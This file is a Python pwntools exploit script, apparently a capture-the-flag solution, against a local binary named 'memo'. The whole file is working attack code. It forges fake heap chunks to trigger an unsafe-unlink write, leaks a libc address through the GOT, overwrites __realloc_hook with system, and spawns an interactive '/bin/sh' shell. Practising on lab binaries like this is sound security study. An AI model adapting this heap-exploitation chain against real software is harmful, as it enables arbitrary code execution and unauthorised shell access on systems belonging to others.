from pwn import *
import sys
import time
import pengutils

#context.log_level = 'DEBUG'
#
elf = ELF('./memo')
p = pengutils.pu('x64')

def read_menu(io):
	return io.recvuntil('6.exit')

def show(io):
	io.send('1'+'\n')

def edit(io, content):
	io.send('2'+'\n')
	io.recvuntil('page:')
	io.send(content)

def tear(io, content, len, pwned =False):
	io.send('3'+'\n')
	io.recvuntil('(bytes):')
	io.send(str(len) + '\n')
	if pwned:
		return
	io.recvuntil('page:')
	io.send(content)

def change_name(io, name):
	io.send('4' + '\n')
	io.recvuntil('name:')
	io.send(name )

def change_title(io, title):
	io.send('5' + '\n')
	io.recvuntil('title:')
	io.send(title)

io = process('./memo')

read_menu(io)

#cur_gdb = pwnlib.gdb.attach(io, execute = open('./expshell' ) )

#change_name(io, 'A'*40)x
'''
stdjunk = ''
for i in range(0, 10):
	stdjunk += 'A%07d'%i

tear(io, stdjunk + 'A' + '\n', 0x180)

stdjunk = ''
for i in range(0, 4):
	stdjunk += 'B%07d'%i
#exp = stdjunk + p64(0xFFFFFFFFFFFFFF50  + 0x8)
exp = stdjunk + '\x01'+'\x00'*7
io.send('7\n')

change_name(io, exp+'\n')



tear(io, 'C'*80 + '\n', 0x80)

'''
stdjunk = p.make_junk(4)
content_addr = 0x602038
name_addr = 0x602040
fake_chunk_fdbk = p64(name_addr - 0x18) + p64(name_addr - 0x10) 
edit(io, stdjunk + fake_chunk_fdbk + p64(0x21)*2  + '\x01' * 32 +  '\n' )


stdjunk = ''
for i in range(0, 1):
	stdjunk += 'B%07d'%i
exp = p64(0x20) + '\x40'

fake_chunk_unlink = p.make_chunk(size=0x0, fd=name_addr - 0x18, bk=name_addr - 0x10 , freed=True)
change_name(io, stdjunk + fake_chunk_unlink + exp)

io.send('7'+'\n')

stdjunk = ''
for i in range(0, 10):
	stdjunk += 'C%07d'%i

tear(io, fake_chunk_fdbk + '\n', 0x100)
tear(io, fake_chunk_fdbk + '\n', 0x80)

tear(io, 'yrpwned!' + '\n', 0x400)
io.send('7'+'\n')
change_name(io, p64(0) + p64(0x602030) + p64(0x601fe0) + p64(0x602028) + p64(0x108))
io.send('\n')
read_menu(io)
show(io)
io.recvuntil('write:\n')
realloc_buf = read_menu(io)[0:6]

realloc_addr = u64(realloc_buf.ljust(8, '\x00'))

log.info('realloc_addr is 0x%x'%realloc_addr)

realloc_offset = 0x7c6e0
system_offset = 0x414f0
realloc_hook_offset = 0x3A3608

libc_addr = realloc_addr - realloc_offset
log.info('libc_addr is 0x%x'%libc_addr)
system_addr = libc_addr + system_offset
realloc_hook = libc_addr + realloc_hook_offset
log.info('realloc_hook _addr is 0x%x'%realloc_hook)
change_name(io, p64(0) + p64(0x602030) + p64(realloc_hook) + p64(0x602030) + p64(0x0))
io.send('\n')
read_menu(io)
edit(io, p64(system_addr) + '\n')
read_menu(io)
change_name(io, '/bin/sh\x00' + p64(0x602030) + p64(0x602028) + p64(0x601fe0) + p64(0))
io.send('7\n')
tear(io, '666', 0x100, True)
#tear(io, 'C'*80 + '\n', 0x80)

io.interactive()